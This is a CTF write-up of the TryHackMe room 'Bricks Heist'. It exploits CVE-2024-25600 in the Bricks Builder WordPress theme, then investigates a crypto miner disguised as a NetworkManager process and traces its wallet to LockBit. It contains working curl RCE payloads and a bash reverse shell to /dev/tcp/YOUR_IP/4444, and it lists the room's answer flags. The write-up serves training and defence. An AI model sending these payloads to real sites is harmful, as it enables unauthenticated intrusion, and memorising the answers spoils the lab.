# TryHack3M: Bricks Heist — Full Writeup

> **Crack the code, command the exploit!** Dive into the heart of the system with just an RCE CVE as your key.

| Difficulty | Category | Tools Used |
|---|---|---|
| Medium | Web Exploitation / Incident Response | Nmap, WPScan, Gobuster, curl, Blockchain Explorer |

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  - [Port Scanning](#port-scanning)
  - [Web Enumeration](#web-enumeration)
  - [WPScan Results](#wpscan-results)
- [Exploitation — CVE-2024-25600](#exploitation--cve-2024-25600)
  - [Confirming RCE](#confirming-rce)
  - [Finding the Hidden .txt File](#finding-the-hidden-txt-file)
  - [Getting a Reverse Shell](#getting-a-reverse-shell)
- [Investigation — Crypto Miner Discovery](#investigation--crypto-miner-discovery)
  - [Identifying the Suspicious Process](#identifying-the-suspicious-process)
  - [Analyzing the Malicious Service](#analyzing-the-malicious-service)
  - [Miner Log File](#miner-log-file)
  - [Decoding the Wallet Address](#decoding-the-wallet-address)
  - [Attributing the Threat Group](#attributing-the-threat-group)
- [Answers Summary](#answers-summary)
- [Lessons Learned](#lessons-learned)

---

## Overview

This room focuses on exploiting a critical RCE vulnerability (CVE-2024-25600) in the Bricks Builder WordPress theme, followed by investigating a hidden cryptocurrency miner planted on the compromised system. The attack chain covers web exploitation, reverse shell access, malware analysis, and OSINT-based threat attribution.

---

## Reconnaissance

### Initial Setup

Add the target to `/etc/hosts`:

```bash
echo "10.145.165.173 bricks.thm" | sudo tee -a /etc/hosts
```

### Port Scanning

```bash
nmap -sC -sV -p- bricks.thm
```

**Results:**

| Port | Service | Details |
|---|---|---|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | WebSockify Python/3.8.10 (returns 405 — expects WebSocket) |
| 443 | HTTPS | Apache httpd (SSL-only mode, self-signed expired cert) |
| 3306 | MySQL | Unauthorized (requires credentials) |

**Key takeaway:** The main web application lives on **port 443 (HTTPS)**. Port 80 runs WebSockify (likely for noVNC), not a standard web server.

### Web Enumeration

```bash
gobuster dir -u https://bricks.thm/ -w /usr/share/wordlists/dirb/common.txt -x txt -k
```

Notable findings:
- `/wp-admin/` — WordPress admin panel
- `/wp-content/` — WordPress content directory
- `/phpmyadmin/` — Database management interface exposed
- `/xmlrpc.php` — XML-RPC enabled (potential brute-force vector)
- `/license.txt` — Standard WordPress license
- `/robots.txt` — Standard WordPress robots file (no hidden paths)

The hidden `.txt` file was **not found** via directory brute-force — its name is an MD5 hash absent from any wordlist.

### WPScan Results

```bash
wpscan --url https://bricks.thm/ --disable-tls-checks --enumerate ap,at,u
```

**Critical findings:**

| Item | Value |
|---|---|
| CMS | WordPress 6.5 |
| Theme | **Bricks Builder 1.9.5** |
| User | `administrator` |
| XML-RPC | Enabled |

**Bricks Builder 1.9.5 is vulnerable to CVE-2024-25600** — an unauthenticated RCE affecting all versions below 1.9.6.1 (CVSS 9.8).

---

## Exploitation — CVE-2024-25600

### Vulnerability Details

CVE-2024-25600 is a critical unauthenticated Remote Code Execution vulnerability in the Bricks Builder WordPress theme. The vulnerable endpoint `/wp-json/bricks/v1/render_element` accepts a `code` element type with `executeCode` enabled, allowing arbitrary PHP execution without authentication.

### Extracting the Nonce

The Bricks nonce is publicly exposed in the page source within the `bricksData` JavaScript variable:

```bash
curl -k -s https://bricks.thm/ | grep -oP '"nonce":"[a-f0-9]+"'
```

Output:
```
"nonce":"f6fef12285"
```

> **Note:** Nonces expire periodically. If you get a `rest_cookie_invalid_nonce` error, re-extract a fresh nonce from the page source.

### Confirming RCE

```bash
curl -k -s https://bricks.thm/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
    "postId": "1",
    "nonce": "f6fef12285",
    "element": {
      "name": "code",
      "settings": {
        "executeCode": "true",
        "code": "<?php echo \"RCE_WORKS\"; ?>"
      }
    }
  }'
```

Response:
```json
{"data":{"html":"<div id=\"brxe-b461a2\" ...>RCE_WORKS</div>"}}
```

RCE confirmed.

### Finding the Hidden .txt File

Standard wordlists cannot find a file named with an MD5 hash. Using RCE to search the filesystem directly:

**Step 1 — Identify the document root:**

```bash
curl -k -s https://bricks.thm/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
    "postId": "1",
    "nonce": "f6fef12285",
    "element": {
      "name": "code",
      "settings": {
        "executeCode": "true",
        "code": "<?php echo getcwd() . \"\\n\" . $_SERVER[\"DOCUMENT_ROOT\"]; ?>"
      }
    }
  }'
```

Result: `/data/www/default` (non-standard path).

**Step 2 — Find all .txt files:**

```bash
curl -k -s https://bricks.thm/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
    "postId": "1",
    "nonce": "f6fef12285",
    "element": {
      "name": "code",
      "settings": {
        "executeCode": "true",
        "code": "<?php echo shell_exec(\"find /data/www/default -name \\\"*.txt\\\" 2>&1\"); ?>"
      }
    }
  }'
```

Among dozens of standard license/readme files, one stands out:

```
/data/www/default/650c844110baced87e1606453b93f22a.txt
```

**Step 3 — Read the file:**

```bash
curl -k https://bricks.thm/650c844110baced87e1606453b93f22a.txt
```

**Answer:** `THM{fl46_650c844110baced87e1606453b93f22a}`

### Getting a Reverse Shell

**Checking disabled PHP functions:**

```php
<?php echo ini_get("disable_functions"); ?>
```

Disabled: `passthru, exec, system, chroot, chgrp, chown, proc_open, proc_get_status, ini_alter, ini_restore`

**Available:** `shell_exec()` ✅, `popen()` ✅

**Step 1 — Start a listener:**

```bash
nc -lvnp 4444
```

**Step 2 — Send reverse shell payload using `shell_exec()`:**

```bash
curl -k -s https://bricks.thm/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
    "postId": "1",
    "nonce": "YOUR_NONCE",
    "element": {
      "name": "code",
      "settings": {
        "executeCode": "true",
        "code": "<?php shell_exec(\"bash -c '\''bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'\''\"); ?>"
      }
    }
  }'
```

**Step 3 — Stabilize the shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then:
stty raw -echo; fg
```

Shell obtained as `apache` (uid=1001).

---

## Investigation — Crypto Miner Discovery

### Identifying the Suspicious Process

```bash
systemctl | grep running
```

Two non-standard services stand out:

| Service | Description | Verdict |
|---|---|---|
| `badr.service` | Badr Service | Custom service, self-deleting binary |
| `ubuntu.service` | **TRYHACK3M** | Fake system service running a miner |

Inspecting `ubuntu.service`:

```bash
systemctl status ubuntu.service
```

```
ubuntu.service - TRYHACK3M
  Main PID: 2706 (nm-inet-dialog)
    └─2706 /lib/NetworkManager/nm-inet-dialog
    └─2707 /lib/NetworkManager/nm-inet-dialog
```

The process `nm-inet-dialog` masquerades as a NetworkManager component, but no such binary exists in legitimate NetworkManager installations.

**Answer (suspicious process):** `nm-inet-dialog`

**Answer (associated service):** `ubuntu.service`

### Analyzing the Malicious Service

```bash
systemctl cat ubuntu.service
```

The service runs `/lib/NetworkManager/nm-inet-dialog` — a cryptocurrency miner disguised as a system component.

### Miner Log File

```bash
ls -la /lib/NetworkManager/
```

Found: `inet.conf` (66KB) — despite the `.conf` extension, this is a binary log file, far too large for a config.

**Answer:** `inet.conf`

### Decoding the Wallet Address

The log contains an encoded ID string. Extracting it:

```bash
strings /lib/NetworkManager/inet.conf | grep -E "^[A-Fa-f0-9]{64,}"
```

The encoded string uses **triple encoding**: Hex → Base64 → Base64.

**Step 1 — Hex to ASCII:**

```bash
echo "5757314e65474e5962484a4f656d78745754...303d" | python3 -c "import sys,binascii; print(binascii.unhexlify(sys.stdin.read().strip()).decode())"
```

Result: `WW1NeGNYbHJOemxtWTNBNW...PT0=` (Base64 string)

**Step 2 — First Base64 decode:**

```bash
echo "WW1NeGNYbHJOemxtWTNBNW...PT0=" | base64 -d
```

Result: `YmMxcXlrNzlmY3A5aGQ1...YQ==` (another Base64 string)

**Step 3 — Second Base64 decode:**

```bash
echo "YmMxcXlrNzlmY3A5aGQ1...YQ==" | base64 -d
```

Result: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` (Bitcoin address, repeated twice)

**One-liner:**

```bash
echo "HEX_STRING" | python3 -c "import sys,binascii; print(binascii.unhexlify(sys.stdin.read().strip()).decode())" | base64 -d | base64 -d
```

**Answer:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

### Attributing the Threat Group

1. Search the wallet address on [Blockchain Explorer](https://www.blockchain.com/explorer)
2. Review transaction history — identify recipient addresses
3. One recipient address: `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`
4. Googling this address leads to [OFAC sanctions page](https://ofac.treasury.gov/recent-actions/20240220)
5. The address belongs to individuals affiliated with the **LockBit** ransomware group

**Answer:** `LockBit`

---

## Answers Summary

| # | Question | Answer |
|---|---|---|
| 1 | What is the content of the hidden .txt file? | `THM{fl46_650c844110baced87e1606453b93f22a}` |
| 2 | What is the name of the suspicious process? | `nm-inet-dialog` |
| 3 | What is the name of the service associated with the suspicious process? | `ubuntu.service` |
| 4 | What is the name of the miner instance log file? | `inet.conf` |
| 5 | What is the wallet address of the miner instance? | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| 6 | Which threat group is associated with the wallet? | `LockBit` |

---

## Lessons Learned

### For Attackers (Red Team)
- **Wordlists have limits.** Files with hash-based names require filesystem access to discover. Sometimes you need to exploit first, enumerate second.
- **Check `disable_functions`.** If even one command execution function is available (`shell_exec`, `popen`), a full reverse shell is possible.
- **Nonces expire.** Always re-extract before sending payloads.

### For Defenders (Blue Team)
- **Block ALL command execution functions** in `php.ini` — missing `shell_exec()` while blocking `exec()` and `system()` is a common mistake.
- **Update themes and plugins immediately.** CVE-2024-25600 was patched in Bricks 1.9.6.1.
- **Don't expose nonces publicly** for sensitive API endpoints.
- **Monitor for masquerading processes.** Legitimate-sounding names like `nm-inet-dialog` in `/lib/NetworkManager/` should be verified against known binaries.
- **Review systemd services regularly.** Custom services with generic names (`ubuntu.service`) and suspicious descriptions are red flags.

### OSINT & Crypto Investigation
- **Blockchain is transparent.** Transaction histories on public explorers can link wallets to known threat actors.
- **OFAC sanctions lists** are invaluable for attributing crypto wallets to specific groups.
- **Triple encoding** (hex + base64 + base64) is a common obfuscation technique — always try layered decoding.

---

> **Author:** AK 
> **Platform:** [TryHackMe](https://tryhackme.com)  
> **Room:** TryHack3M: Bricks Heist  
> **Date:** April 2026
